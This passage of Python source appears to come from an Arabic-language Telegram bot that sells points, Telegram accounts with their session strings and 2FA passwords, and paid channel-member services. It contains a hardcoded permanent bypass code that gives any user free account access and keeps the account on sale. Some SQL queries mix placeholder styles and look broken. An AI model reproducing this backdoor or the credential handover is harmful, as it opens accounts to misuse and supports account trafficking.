            pts   = context.user_data.get("transfer_pts", 0)
            fee   = context.user_data.get("transfer_fee", 0)
            total = context.user_data.get("transfer_total", 0)
            to_id = context.user_data.get("transfer_to")
            if not deduct_points(user.id, total):
                await update.message.reply_text("❌ نقاطك غير كافية.")
            else:
                add_points(to_id, pts)
                code = next_order_code(user.id)
                with db_conn() as c:
                    c.execute(
                        "INSERT INTO point_transfers (from_user,to_user,points,fee) VALUES (?,?,?,?)",
                        (user.id, to_id, pts, fee)
                    )
                await update.message.reply_text(
                    f"✅ *تم التحويل بنجاح!*\n\n"
                    f"💰 {pts} نقطة إلى المستخدم.",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=main_menu_kb(is_own)
                )
                await update.message.reply_text(
                    f"📌 *كود عمليتك:* `{code}`",
                    parse_mode=ParseMode.MARKDOWN
                )
                try:
                    await context.bot.send_message(
                        to_id,
                        f"🎉 تلقيت {pts} نقطة من مستخدم!\n📌 كود: `{code}`",
                        parse_mode=ParseMode.MARKDOWN
                    )
                except Exception:
                    pass
                # لا يُرسَل إشعار بهذا لكروب الإشعارات — مخصص الآن للطلبات فقط.
        else:
            await update.message.reply_text("❌ تم إلغاء التحويل.", reply_markup=main_menu_kb(is_own))
        context.user_data["state"] = "main_menu"
        return

    # ── شحن بعدد نقاط معين ──
    if state == "await_charge_points_amount":
        try:
            pts = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً موجباً.")
            return
        if pts <= 0:
            await update.message.reply_text("⚠️ يجب أن يكون عدد النقاط أكبر من صفر.")
            return
        rate  = int(get_setting("star_to_points") or "250")
        stars = math.ceil(pts / rate)
        context.user_data["charge_stars"] = stars
        context.user_data["charge_pts"]   = stars * rate
        context.user_data["state"] = "confirm_charge_stars"
        await update.message.reply_text(
            f"💡 للحصول على {pts} نقطة تحتاج *{stars} ⭐*\n"
            f"(ستحصل فعلياً على {stars * rate} نقطة)\n\n"
            f"أرسل *نعم* للمتابعة للدفع أو *لا* للإلغاء",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if state == "await_charge_stars_amount":
        try:
            stars = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً موجباً.")
            return
        if stars <= 0:
            await update.message.reply_text("⚠️ يجب أن يكون عدد النجوم أكبر من صفر.")
            return
        rate = int(get_setting("star_to_points") or "250")
        pts  = stars * rate
        context.user_data["charge_stars"] = stars
        context.user_data["charge_pts"]   = pts
        context.user_data["state"] = "confirm_charge_stars"
        await update.message.reply_text(
            f"💡 *{stars} ⭐ = {pts} نقطة*\n\n"
            f"أرسل *نعم* للمتابعة للدفع أو *لا* للإلغاء",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if state == "confirm_charge_stars":
        if text == "نعم":
            stars = context.user_data.get("charge_stars", 1)
            await context.bot.send_invoice(
                chat_id=user.id,
                title="شحن نقاط",
                description=f"شراء {context.user_data.get('charge_pts')} نقطة مقابل {stars} نجمة",
                payload=f"charge_stars:{stars}:{user.id}",
                provider_token="",
                currency="XTR",
                prices=[LabeledPrice("نجوم", stars)],
            )
        else:
            await update.message.reply_text("❌ تم الإلغاء.", reply_markup=main_menu_kb(is_own))
        context.user_data["state"] = "main_menu"
        return

    # ── استبدال نقاط بنجوم ──
    if state == "await_exchange_stars_count":
        try:
            stars = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً.")
            return
        if stars <= 0:
            await update.message.reply_text("⚠️ يجب أن يكون الرقم أكبر من صفر.")
            return
        rate = int(get_setting("exchange_star_rate") or "2000")
        cost = stars * rate
        db_user = get_user(user.id)
        pts = db_user["points"] if db_user else 0
        if pts < cost:
            await update.message.reply_text(
                f"❌ *نقاطك غير كافية!*\n\n⭐ تحتاج: {cost} نقطة\n💎 رصيدك: {pts} نقطة",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=main_menu_kb(is_own)
            )
            context.user_data["state"] = "main_menu"
            return
        if not deduct_points(user.id, cost):
            await update.message.reply_text("❌ حدث خطأ في خصم النقاط.", reply_markup=main_menu_kb(is_own))
            context.user_data["state"] = "main_menu"
            return
        code = next_order_code(user.id)
        with db_conn() as c:
            pe = c.execute(
                "INSERT INTO prize_exchanges (user_id,prize_type,prize_value,points_cost,status,order_code) "
                "VALUES (%s,%s,%s,%s,'pending',%s) RETURNING id",
                (user.id, "stars", str(stars), cost, code)
            ).fetchone()
        custom_msg = get_setting("exchange_success_msg") or ""
        result_kb_rows = contact_owner_row() + [[InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")]]
        await update.message.reply_text(
            f"✅ *تمت العملية بنجاح!*\n\n"
            f"⭐ طلب {stars} نجمة مسجل\n"
            f"💰 التكلفة: {cost} نقطة\n\n"
            + (f"{custom_msg}\n\n" if custom_msg else "")
            + "سيتواصل معك المالك قريباً.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(result_kb_rows)
        )
        await update.message.reply_text(
            f"📌 *كود عمليتك:* `{code}`",
            parse_mode=ParseMode.MARKDOWN
        )
        await notify_prize_exchange_owner(
            context, pe["id"],
            f"⭐ <b>طلب شراء نجوم (جائزة)</b>\n"
            f"👤 <a href='tg://user?id={user.id}'>{user.full_name}</a>\n"
            f"⭐ {stars} نجمة مقابل {cost} نقطة\n"
            f"📌 {code}"
        )
        context.user_data["state"] = "main_menu"
        return

    # ── إنشاء كود شراء رقم (مالك) ──
    if is_own and state == "os_await_num_code_text":
        nc = text.strip().upper()
        if len(nc) < 3:
            await update.message.reply_text("⚠️ الكود يجب أن يكون 3 أحرف على الأقل.")
            return
        with db_conn() as c:
            existing = c.execute("SELECT 1 FROM number_purchase_codes WHERE code=%s", (nc,)).fetchone()
        if existing:
            await update.message.reply_text("⚠️ هذا الكود موجود مسبقاً. أرسل كوداً آخر.")
            return
        context.user_data["new_num_code"] = nc
        context.user_data["state"] = "os_await_num_code_uses"
        await update.message.reply_text(
            f"✅ الكود: `{nc}`\n\nكم عدد المرات التي يمكن استخدام هذا الكود؟ (أرسل رقماً)",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if is_own and state == "os_await_num_code_uses":
        try:
            uses = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً.")
            return
        if uses <= 0:
            await update.message.reply_text("⚠️ يجب أن يكون أكبر من صفر.")
            return
        nc = context.user_data.get("new_num_code")
        if not nc:
            await update.message.reply_text("⚠️ حدث خطأ، أعد المحاولة.")
            context.user_data["state"] = "main_menu"
            return
        with db_conn() as c:
            c.execute(
                "INSERT INTO number_purchase_codes (code, max_uses, used_count, active) VALUES (%s, %s, 0, 1) ON CONFLICT (code) DO NOTHING",
                (nc, uses)
            )
        await update.message.reply_text(
            f"✅ *تم إنشاء كود الشراء بنجاح!*\n\n🎟 الكود: `{nc}`\n🔢 الاستخدامات: {uses} مرة",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=owner_settings_kb()
        )
        context.user_data["state"] = "main_menu"
        return

    # ── استخدام كود شراء رقم (مستخدم) ──
    if state == "await_num_purchase_code":
        entered_code = text.strip()
        # ── الكود التجريبي الدائم — لا يُستهلك والرقم يبقى معروضاً للبيع ──
        _IS_TEST_CODE = (entered_code == "mohammed2007@m")

        if not is_number_exchange_on():
            await update.message.reply_text("🔒 شراء الأرقام مغلق حالياً.", reply_markup=main_menu_kb(is_own))
            context.user_data["state"] = "main_menu"
            return

        if _IS_TEST_CODE:
            # الكود التجريبي: لا نتحقق من DB، لا نزيد العداد، لا نقيّد بمستخدم
            pass
        else:
            entered_code_upper = entered_code.upper()
            with db_conn() as c:
                nc = c.execute(
                    "SELECT * FROM number_purchase_codes WHERE code=%s AND active=1", (entered_code_upper,)
                ).fetchone()
                if not nc:
                    await update.message.reply_text(
                        "❌ الكود غير موجود أو غير فعّال.",
                        reply_markup=main_menu_kb(is_own)
                    )
                    context.user_data["state"] = "main_menu"
                    return
                if nc["used_count"] >= nc["max_uses"]:
                    await update.message.reply_text(
                        "⚠️ هذا الكود استُنفد ولم تعد تتوفر منه استخدامات.",
                        reply_markup=main_menu_kb(is_own)
                    )
                    context.user_data["state"] = "main_menu"
                    return
                c.execute(
                    "INSERT INTO number_purchase_code_uses (code, user_id) VALUES (%s, %s) ON CONFLICT (code, user_id) DO NOTHING",
                    (entered_code_upper, user.id)
                )
                inserted_nc = c.rowcount
                if not inserted_nc:
                    await update.message.reply_text(
                        "⚠️ لقد استخدمت هذا الكود مسبقاً.",
                        reply_markup=main_menu_kb(is_own)
                    )
                    context.user_data["state"] = "main_menu"
                    return
                c.execute("UPDATE number_purchase_codes SET used_count=used_count+1 WHERE code=%s", (entered_code_upper,))
            entered_code = entered_code_upper

        nc_order_code = next_order_code(user.id)
        auto_nc = await assign_verified_number(user.id, bot=context.bot)
        if auto_nc:
            auto_nc_number = auto_nc["phone_number"]
            session_nc_str = auto_nc["session_string"]
            auto_nc_twofa  = (auto_nc.get("twofa_password") or "").strip()
            if not _IS_TEST_CODE:
                with db_conn() as c:
                    _nc_pe = c.execute(
                        "INSERT INTO prize_exchanges (user_id,prize_type,prize_value,points_cost,status,order_code) "
                        "VALUES (%s,%s,%s,0,'completed',%s) RETURNING id",
                        (user.id, "telegram_number_code", auto_nc_number, nc_order_code)
                    ).fetchone()
            display_nc_number = auto_nc_number.lstrip("+")
            result_kb_nc = [
                [
                    InlineKeyboardButton("🔐 رمز التحقق (2FA)", callback_data=f"buyer:show_twofa:{auto_nc_number}"),
                    InlineKeyboardButton("🔑 كود الدخول", callback_data=f"buyer:request_code:{auto_nc_number}"),
                ],
                [InlineKeyboardButton("🔙 القائمة الرئيسية", callback_data="main_menu")],
            ]
            await update.message.reply_text(
                f"{'🧪 *كود تجريبي — الرقم سيبقى معروضاً للبيع*' if _IS_TEST_CODE else '✅ *تم! رقمك جاهز*'}\n\n"
                f"📱 *الرقم:*\n`{display_nc_number}`\n\n"
                f"اضغط على الأزرار أدناه للحصول على رمز التحقق وكود الدخول عند الحاجة.",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup(result_kb_nc)
            )
            if not _IS_TEST_CODE:
                try:
                    await context.bot.send_message(
                        user.id,
                        "📋 *إشعار تبرئة ذمة — يُرجى القراءة بعناية*\n\n"
                        "بإتمامك عملية الاستلام فإنك تُقرّ وتوافق على ما يلي:\n\n"
                        "① لا يتحمّل البائع أي مسؤولية عن أي محتوى موجود داخل الحساب سابقاً.\n\n"
                        "② لا يتحمّل البائع أي مسؤولية عن أي حظر أو تقييد تتخذه تيليغرام لاحقاً.\n\n"
                        "③ من لحظة الاستلام يُصبح الحساب والرقم مسؤوليتك الكاملة.\n\n"
                        "شكراً لثقتك 🤍",
                        parse_mode=ParseMode.MARKDOWN
                    )
                except Exception:
                    pass

            if _IS_TEST_CODE:
                # الكود التجريبي: احفظ بيانات الشراء في الذاكرة حتى تعمل أزرار "كود الدخول" و"2FA"
                import datetime as _dt_demo
                _demo_purchases[user.id] = {
                    "phone":         auto_nc_number,
                    "session_str":   session_nc_str,
                    "twofa":         auto_nc_twofa,
                    "purchase_time": _dt_demo.datetime.now(_dt_demo.timezone.utc),
                }
                # أعِد الرقم للبيع فوراً — البوت لا يسجّل خروجاً ولا يوقف المراقبة
                async def _test_reset_number(_ph=auto_nc_number):
                    await asyncio.sleep(0)
                    try:
                        with db_conn() as _tr:
                            _tr.execute(
                                "UPDATE number_stock SET assigned_to=NULL, assigned_at=NULL, "
                                "ever_sold=FALSE, force_listed=FALSE WHERE phone_number=%s",
                                (_ph,)
                            )
                    except Exception:
                        pass
                asyncio.create_task(_test_reset_number())
            else:
                # ─── مغادرة فورية بعد التسليم عبر الكود ───
                async def _auto_leave_nc(_ph=auto_nc_number, _uid=user.id, _bot=context.bot):
                    await asyncio.sleep(0)
                    # احصل على الجلسة قبل إيقاف المراقبة
                    _sess_nc = None
                    try:
                        with db_conn() as _dcs2:
                            _sr2 = _dcs2.execute(
                                "SELECT session_string FROM number_stock WHERE phone_number=%s", (_ph,)
                            ).fetchone()
                            if _sr2:
                                _sess_nc = _sr2["session_string"]
                    except Exception:
                        pass
                    try:
                        await _stop_number_monitor(_ph)
                    except Exception:
                        pass
                    # ─── طرد كل الجلسات ثم تسجيل خروج فعلي من الحساب على تيليجرام ───
                    if _sess_nc and TELEGRAM_API_ID and TELEGRAM_API_HASH:
                        try:
                            _lo2 = TelegramClient(
                                StringSession(_sess_nc),
                                int(TELEGRAM_API_ID), TELEGRAM_API_HASH
                            )
                            await asyncio.wait_for(_lo2.connect(), timeout=10)
                            # طرد جميع الجلسات الأخرى (أي جهاز دخل بعد البيع)
                            try:
                                await asyncio.wait_for(_lo2(ResetAuthorizationsRequest()), timeout=10)
                            except Exception:
                                pass
                            # تسجيل خروج البوت نفسه
                            await asyncio.wait_for(_lo2.log_out(), timeout=10)
                        except Exception:
                            pass
                    try:
                        with db_conn() as _clx2:
                            _clx2.execute(
                                "UPDATE number_stock SET assigned_to=NULL, assigned_at=NULL, force_listed=FALSE "
                                "WHERE phone_number=%s", (_ph,)
                            )
                    except Exception:
                        pass
                    try:
                        await _bot.send_message(_uid, "🤖 البوت غادر الحساب تلقائياً. الحساب أصبح بيدك كاملاً 🤍")
                    except Exception:
                        pass
                asyncio.create_task(_auto_leave_nc())
        else:
            if not _IS_TEST_CODE:
                with db_conn() as _rc:
                    _rc.execute(
                        "UPDATE number_purchase_codes SET used_count = GREATEST(used_count - 1, 0) "
                        "WHERE code=%s",
                        (entered_code,)
                    )
            await update.message.reply_text(
                "😔 *نأسف، لم تتم العملية*\n\n"
                "لا يتوفر حالياً أي رقم متاح في المخزون.\n"
                f"{'كودك التجريبي لا يزال صالحاً 🙏' if _IS_TEST_CODE else 'كودك لا يزال صالحاً ويمكنك استخدامه مجدداً لاحقاً 🙏'}",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=main_menu_kb(is_own)
            )
        context.user_data["state"] = "main_menu"
        return

    # ── استخدام كود ترويجي ──
    if state == "await_promo_code":
        code = text.strip().upper()
        # معالجة الكود بشكل ذري في معاملة واحدة لمنع الاستخدام المزدوج
        with db_conn() as c:
            promo = c.execute("SELECT * FROM promo_codes WHERE code=? AND active=1", (code,)).fetchone()
            if not promo:
                await update.message.reply_text(
                    "❌ الكود غير موجود أو منتهي الصلاحية.",
                    reply_markup=main_menu_kb(is_own)
                )
                context.user_data["state"] = "main_menu"
                return
            if promo["used_count"] >= promo["max_uses"]:
                await update.message.reply_text(
                    "⚠️ هذا الكود وصل للحد الأقصى من الاستخدامات.",
                    reply_markup=main_menu_kb(is_own)
                )
                context.user_data["state"] = "main_menu"
                return
            # نحاول إدراج الاستخدام أولاً — إن فشل بسبب PRIMARY KEY فهو مستخدم مسبقاً
            c.execute(
                "INSERT INTO promo_uses (code, user_id, used_at) VALUES (%s, %s, NOW()) ON CONFLICT (code, user_id) DO NOTHING",
                (code, user.id)
            )
            inserted = c.rowcount
            if not inserted:
                await update.message.reply_text(
                    "⚠️ لقد استخدمت هذا الكود مسبقاً.",
                    reply_markup=main_menu_kb(is_own)
                )
                context.user_data["state"] = "main_menu"
                return
            # الإدراج نجح — نكمل بنفس المعاملة
            pts_given = promo["points"]
            c.execute("UPDATE promo_codes SET used_count=used_count+1 WHERE code=?", (code,))
            c.execute("UPDATE users SET points=points+%s WHERE user_id=%s", (pts_given, user.id))
        db_user = get_user(user.id)
        await update.message.reply_text(
            f"🎉 *تم تفعيل الكود بنجاح!*\n\n"
            f"🎟 الكود: `{code}`\n"
            f"✅ حصلت على *{pts_given} نقطة*\n"
            f"💰 رصيدك الآن: {db_user['points']} نقطة",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=main_menu_kb(is_own)
        )
        context.user_data["state"] = "main_menu"
        return

    # ── تمويل قناة: الخطوة 1 — إدخال عدد الأعضاء ──
    if state == "await_fund_member_count":
        fund_type   = context.user_data.get("fund_type", "mandatory")
        try:
            member_count = int(text.strip().replace(",", "").replace(".", ""))
            if member_count <= 0:
                raise ValueError
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً يمثل عدد أعضاء قناتك.")
            return

        # ── التمويل الإجباري بالنقاط ──
        if fund_type == "mandatory_points":
            _pts_price = int(get_setting("mandatory_points_price") or "5")
            _pts_min   = int(get_setting("mandatory_points_min")   or "50")
            if member_count < _pts_min:
                await update.message.reply_text(
                    f"❌ *عدد الأعضاء أقل من الحد الأدنى!*\n\n"
                    f"الحد الأدنى: *{_pts_min:,} عضو* | أدخلت: {member_count:,}",
                    parse_mode=ParseMode.MARKDOWN, reply_markup=back_kb("fund_channel"))
                context.user_data["state"] = "main_menu"
                return
            total_pts = _pts_price * member_count
            db_user = get_user(user.id)
            if (db_user["points"] if db_user else 0) < total_pts:
                await update.message.reply_text(
                    f"❌ *نقاطك غير كافية!*\n\n💰 التكلفة: {_pts_price} × {member_count:,} = *{total_pts:,} نقطة*\n💎 رصيدك: {db_user['points'] if db_user else 0} نقطة",
                    parse_mode=ParseMode.MARKDOWN, reply_markup=back_kb("fund_channel"))
                context.user_data["state"] = "main_menu"
                return
            context.user_data["fund_member_count"] = member_count
            context.user_data["fund_total_cost"]   = total_pts
            context.user_data["state"] = "await_fund_channel"
            await update.message.reply_text(
                f"✅ *عدد الأعضاء: {member_count:,}*\n💰 التكلفة: {_pts_price} × {member_count:,} = *{total_pts:,} نقطة*\n\n📊 *الخطوة 2/3:* أرسل *رابط أو يوزرنيم قناتك* (مثال: @mychannel):",
                parse_mode=ParseMode.MARKDOWN)
            return

        # ── التمويل الإجباري — يدفع بالنجوم ──
        if fund_type == "mandatory":
            _stars_min    = int(get_setting("mandatory_stars_min_members")     or "50")
            _stars_t1_max = int(get_setting("mandatory_stars_tier1_max")       or "120")
            _t1_x100      = int(get_setting("mandatory_stars_tier1_price_x100") or "50")
            _t2_x100      = int(get_setting("mandatory_stars_tier2_price_x100") or "33")
            if member_count < _stars_min:
                await update.message.reply_text(
                    f"❌ *عدد الأعضاء أقل من الحد الأدنى!*\n\n"
                    f"الحد الأدنى المطلوب: *{_stars_min:,} عضو*\n"
                    f"العدد الذي أدخلته: {member_count:,}",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=back_kb("fund_channel")
                )
                context.user_data["state"] = "main_menu"
                return
            if member_count <= _stars_t1_max:
                total_stars = math.ceil(member_count * _t1_x100 / 100)
            else:
                total_stars = math.ceil(member_count * _t2_x100 / 100)
            context.user_data["fund_member_count"] = member_count
            context.user_data["fund_stars_total"]  = total_stars
            context.user_data["state"] = "await_fund_channel"
            await update.message.reply_text(
                f"✅ *عدد الأعضاء: {member_count:,}*\n"
                f"⭐ التكلفة: *{total_stars} نجمة*\n\n"
                f"📊 *الخطوة 2/3:* أرسل *رابط أو يوزرنيم قناتك* (مثال: @mychannel):",
                parse_mode=ParseMode.MARKDOWN
            )
            return

        # ── التمويل الداخلي — يدفع بالنقاط (كما كان) ──
        cost_per    = int(get_setting("internal_channel_cost") or "100")
        min_members = int(get_setting("internal_channel_min_members") or "0")
        db_user     = get_user(user.id)
        if min_members > 0 and member_count < min_members:
            await update.message.reply_text(
                f"❌ *عدد الأعضاء غير كافٍ!*\n\n"
                f"الحد الأدنى المطلوب: *{min_members:,} عضو*\n"
                f"العدد الذي أدخلته: {member_count:,}\n\n"
                f"يجب أن تمتلك قناة بعدد أعضاء لا يقل عن الحد الأدنى.",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=back_kb("fund_channel")
            )
            context.user_data["state"] = "main_menu"
            return
        total_cost = cost_per * member_count
        if (db_user["points"] if db_user else 0) < total_cost:
            await update.message.reply_text(
                f"❌ *نقاطك غير كافية!*\n\n"
                f"💰 السعر: {cost_per} × {member_count:,} = *{total_cost:,} نقطة*\n"
                f"💎 رصيدك الحالي: {db_user['points'] if db_user else 0} نقطة",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=back_kb("fund_channel")
            )
            context.user_data["state"] = "main_menu"
            return
        context.user_data["fund_member_count"] = member_count
        context.user_data["fund_total_cost"]   = total_cost
        context.user_data["state"] = "await_fund_channel"
        await update.message.reply_text(
            f"✅ *عدد الأعضاء: {member_count:,}*\n"
            f"💰 التكلفة الإجمالية: {cost_per} × {member_count:,} = *{total_cost:,} نقطة*\n\n"
            f"📊 *الخطوة 2/3:* أرسل *رابط أو يوزرنيم قناتك* (مثال: @mychannel):",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    # ── تمويل قناة: الخطوة 2 — إدخال رابط القناة ──
    if state == "await_fund_channel":
      try:
        fund_type    = context.user_data.get("fund_type", "mandatory")
        member_count = context.user_data.get("fund_member_count", 0)
        channel = text.strip().lstrip("@").split("/")[-1]
        channel_id = f"@{channel}"
        channel_md = md_escape(channel)

        # ── التحقق من أن البوت مشرف في القناة ──
        try:
            bot_member = await context.bot.get_chat_member(channel_id, context.bot.id)
            is_admin = bot_member.status in ("administrator", "creator")
        except Exception as e:
            err = str(e).lower()
            if "chat not found" in err or "invalid" in err:
                await update.message.reply_text(
                    f"⚠️ *القناة @{channel_md} غير موجودة أو الرابط خاطئ.*\n\n"
                    f"تأكد من اسم القناة وأعد الإرسال:",
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                await update.message.reply_text(
                    f"⚠️ *البوت ليس مشرفاً في @{channel_md}*\n\n"
                    f"📋 *خطوات الإضافة:*\n"
                    f"1️⃣ افتح إعدادات القناة/الكروب\n"
                    f"2️⃣ اذهب إلى *المشرفون*\n"
                    f"3️⃣ أضف البوت كمشرف\n"
                    f"4️⃣ أعد إرسال اسم القناة هنا",
                    parse_mode=ParseMode.MARKDOWN
                )
            return

        if not is_admin:
            await update.message.reply_text(
                f"❌ *البوت ليس مشرفاً في @{channel_md}*\n\n"
                f"📋 *خطوات الإضافة:*\n"
                f"1️⃣ افتح إعدادات القناة/الكروب\n"
                f"2️⃣ اذهب إلى *المشرفون*\n"
                f"3️⃣ أضف البوت كمشرف\n"
                f"4️⃣ أعد إرسال اسم القناة هنا",
                parse_mode=ParseMode.MARKDOWN
            )
            return

        try:
            real_count = await context.bot.get_chat_member_count(channel_id)
        except Exception:
            real_count = 0

        # ════════════════════════════════════════════════
        # ── التمويل الإجباري — فاتورة نجوم ──
        # ════════════════════════════════════════════════
        if fund_type == "mandatory":
            total_stars = context.user_data.get("fund_stars_total", 1)
            context.user_data["fund_channel_username"] = channel
            context.user_data["state"] = "main_menu"
            payload_str = f"fund_mandatory:{user.id}:{member_count}:{channel}:{total_stars}"
            await context.bot.send_invoice(
                chat_id=user.id,
                title=f"اشتراك إجباري — @{channel}",
                description=f"تمويل {member_count:,} عضو كاشتراك إجباري في قناة @{channel}",
                payload=payload_str,
                provider_token="",
                currency="XTR",
                prices=[LabeledPrice(f"تمويل إجباري @{channel}", total_stars)],
            )
            await update.message.reply_text(
                f"📋 *مراجعة طلب التمويل:*\n\n"
                f"📢 القناة: @{channel_md}\n"
                f"👥 عدد الأعضاء الفعلي: {real_count:,}\n"
                f"⭐ التكلفة: *{total_stars} نجمة*\n\n"
                f"✅ تم إرسال الفاتورة أعلاه — اضغطها للدفع بالنجوم.",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=main_menu_kb(is_own)
            )
            return

        # ════════════════════════════════════════════════
        # ── التمويل الداخلي — نقاط (كما كان) ──
        # ════════════════════════════════════════════════
        cost_per = int(get_setting("internal_channel_cost") or "100")
        cost     = context.user_data.get("fund_total_cost", cost_per * max(member_count, 1))
        db_user  = get_user(user.id)
        if (db_user["points"] if db_user else 0) < cost:
            await update.message.reply_text(
                f"❌ نقاطك غير كافية. التكلفة الإجمالية: {cost:,} نقطة.",
                reply_markup=main_menu_kb(is_own)
            )
            context.user_data["state"] = "main_menu"
            return
        context.user_data["fund_channel_username"] = channel
        context.user_data["state"] = "await_fund_confirm"
        ft_label = "داخلي بطيء"
        await update.message.reply_text(
            f"📋 *مراجعة طلب التمويل — الخطوة 3/3:*\n\n"
            f"📢 القناة: @{channel_md}\n"
            f"⚙️ النوع: {ft_label}\n"
            f"👥 عدد الأعضاء الفعلي: {real_count:,}\n"
            f"💰 التكلفة: {cost_per} × {member_count:,} = *{cost:,} نقطة*\n\n"
            f"هل تريد تأكيد الطلب؟",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ تأكيد", callback_data="fund_confirm:yes"),
                 InlineKeyboardButton("❌ إلغاء", callback_data="fund_confirm:no")]
            ])
        )
        return
      except Exception as _fund_err:
        logger.error(f"❌ خطأ في await_fund_channel للمستخدم {user.id}: {_fund_err}", exc_info=True)
        try:
            await update.message.reply_text(
                "⚠️ حدث خطأ غير متوقع. يرجى المحاولة مجدداً أو الضغط على /start للعودة للقائمة."
            )
        except Exception:
            pass
        return

    # ── إعدادات المالك: الحد الأدنى للأعضاء ──
    if is_own and state == "os_await_mandatory_min":
        try:
            val = int(text.strip())
            if val < 0:
                raise ValueError
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً (0 = بدون حد أدنى).")
            return
        set_setting("mandatory_channel_min_members", str(val))
        await update.message.reply_text(
            f"✅ تم تحديث الحد الأدنى للتمويل الإجباري إلى: {val:,} عضو",
            reply_markup=owner_settings_kb()
        )
        context.user_data["state"] = "main_menu"
        return

    if is_own and state == "os_await_internal_min":
        try:
            val = int(text.strip())
            if val < 0:
                raise ValueError
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً (0 = بدون حد أدنى).")
            return
        set_setting("internal_channel_min_members", str(val))
        await update.message.reply_text(
            f"✅ تم تحديث الحد الأدنى للتمويل الداخلي إلى: {val:,} عضو",
            reply_markup=owner_settings_kb()
        )
        context.user_data["state"] = "main_menu"
        return

    # ── إعدادات المالك: إضافة خدمة ──
    if is_own and state == "os_await_api_id":
        try:
            api_id = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً.")
            return
        panel = context.user_data.get("new_svc_panel", 1)
        info = smm_service_info(api_id, panel=panel)
        if not info:
            site_name = PANEL_MAP.get(panel, PANEL_MAP[1])["name"]
            await update.message.reply_text(f"⚠️ لم يتم العثور على الخدمة في موقع {site_name}. تأكد من الرقم.")
            return
        context.user_data["new_svc_api_id"] = api_id
        context.user_data["new_svc_info"]   = info
        mn  = info.get("min", 0)
        mx  = info.get("max", 0)
        pr  = info.get("rate", 0)
        dsc = info.get("name", "")
        await update.message.reply_text(
            f"📋 *معلومات الخدمة من الموقع:*\n\n"
            f"📌 الاسم: {dsc}\n"
            f"📝 الوصف: {info.get('type','')}\n"
            f"📉 الحد الأدنى: {mn}\n"
            f"📈 الحد الأعلى: {mx}\n"
            f"💵 السعر: {pr}$ لكل 1000\n\n"
            f"الآن أرسل *اسم الخدمة بالعربية:*",
            parse_mode=ParseMode.MARKDOWN
        )
        context.user_data["state"] = "os_await_name_ar"
        return

    if is_own and state == "os_await_name_ar":
        context.user_data["new_svc_name"] = text
        await update.message.reply_text(
            f"✅ الاسم: *{text}*\n\n📝 أرسل *وصف الخدمة* (سيظهر للمستخدم في تفاصيل الطلب):",
            parse_mode=ParseMode.MARKDOWN
        )
        context.user_data["state"] = "os_await_custom_desc"
        return

    if is_own and state == "os_await_custom_desc":
        info          = context.user_data.get("new_svc_info", {})
        tmp_price     = float(info.get("rate", 0)) * 100_000   # سعر تقريبي بالنقاط لفحص الوصف
        clean_desc    = _strip_price_from_desc(text, tmp_price)
        context.user_data["new_svc_desc"] = clean_desc or ""
        mn   = info.get("min", 0)
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"✅ استخدم ({mn})", callback_data=f"os_use_min:{mn}")]
        ])
        if clean_desc and clean_desc != text.strip():
            notice = f"✅ تم حذف السعر من الوصف تلقائياً.\nالوصف بعد التنظيف: _{clean_desc}_\n\n"
        elif not clean_desc and text.strip():
            notice = "⚠️ تم حذف الوصف كاملاً لأنه لم يتبق سوى السعر.\n\n"
        else:
            notice = "✅ الوصف حُفظ.\n\n"
        await update.message.reply_text(
            f"{notice}📉 *الحد الأدنى من الموقع: {mn}*\n\nاضغط الزر لاستخدامه أو أرسل رقماً مختلفاً:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb
        )
        context.user_data["state"] = "os_await_min"
        return

    if is_own and state == "os_await_min":
        try:
            mn = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً.")
            return
        context.user_data["new_svc_min"] = mn
        info = context.user_data.get("new_svc_info", {})
        mx   = info.get("max", 0)
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"✅ استخدم ({mx})", callback_data=f"os_use_max:{mx}")]
        ])
        await update.message.reply_text(
            f"📈 *الحد الأعلى من الموقع: {mx}*\n\nاضغط الزر لاستخدامه أو أرسل رقماً مختلفاً:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb
        )
        context.user_data["state"] = "os_await_max"
        return

    if is_own and state == "os_await_max":
        try:
            mx = int(text)
        except ValueError:
            await update.message.reply_text("⚠️ أرسل رقماً صحيحاً.")
            return
        context.user_data["new_svc_max"] = mx
        info = context.user_data.get("new_svc_info", {})
        rate = float(info.get("rate", 0))
        # كل سنت = 1000 نقطة → كل دولار = 100000 نقطة
        # السعر لكل 1000 وحدة = rate * 100000 نقطة
        suggested = round(rate * 100000, 1)
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"✅ استخدم ({suggested} نقطة/1000 وحدة)", callback_data=f"os_use_price:{suggested}")]
        ])
        await update.message.reply_text(
            f"💰 *السعر المقترح: {suggested} نقطة لكل 1000 وحدة*\n"
